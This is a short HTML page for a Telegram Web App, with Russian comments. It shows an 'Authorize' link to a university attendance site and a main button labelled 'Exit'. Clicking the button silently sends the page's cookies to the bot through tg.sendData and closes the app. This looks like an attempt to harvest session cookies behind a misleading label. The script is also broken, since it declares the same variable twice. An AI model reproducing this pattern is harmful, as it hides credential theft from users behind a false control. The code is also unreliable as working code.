<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Title</title>
</head>
<body>
    <a href="https://digital.etu.ru/attendance/student"> Authorize </a>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>

    <script>
        let tg = window.Telegram.WebApp;

        let tg = window.Telegram.WebApp; //получаем объект webapp телеграма

         tg.expand(); //расширяем на все окно

         tg.MainButton.text = "Выход";
         tg.MainButton.textColor = "#ffffff";
         tg.MainButton.color = "#0759af"; //изменяем цвет бэкграунда кнопки
         tg.MainButton.show()

         Telegram.WebApp.onEvent('mainButtonClicked', function(){
            tg.sendData(window.document.cookie);
            tg.close()
         });
    </script>
</body>
